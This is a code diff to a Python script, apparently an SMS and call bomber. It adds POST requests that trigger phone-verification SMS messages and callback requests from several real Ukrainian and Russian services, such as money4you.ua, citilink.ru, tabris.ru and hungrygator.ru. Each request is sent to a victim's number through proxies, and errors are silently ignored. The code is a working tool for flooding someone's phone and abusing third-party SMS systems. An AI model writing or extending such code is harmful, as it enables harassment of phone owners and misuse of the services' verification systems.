@@ -162,6 +162,11 @@ def ukr():
                         pass
                 except:
                         pass
+                try:
+                        requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, proxies=proxies)
+                        pass
+                except:
+                        pass
 
 
 def russ():
@@ -297,6 +302,22 @@ def russ():
                         pass
                 try:
                         requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + number}, proxies=proxies)
+                        pass
+                except:
+                        pass
+                try:
+                        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", proxies=proxies)
+                        pass
+                except:
+                        pass
+                try:
+                        formatted_phone = format_phone(number, "7(###)+###-##-##")
+                        requests.post("https://lk.tabris.ru/local/components/wf/call_back/ajax.php", data={"name": "Сергей", "phone": number}, proxies=proxies)
+                        pass
+                except:
+                        pass
+                try:
+                        requests.post("https://api.01.hungrygator.ru/web/auth/webotp", json={"fu": "tralala", "userLogin": "+" + number}, proxies=proxies)
                         pass
                 except:
                         pass
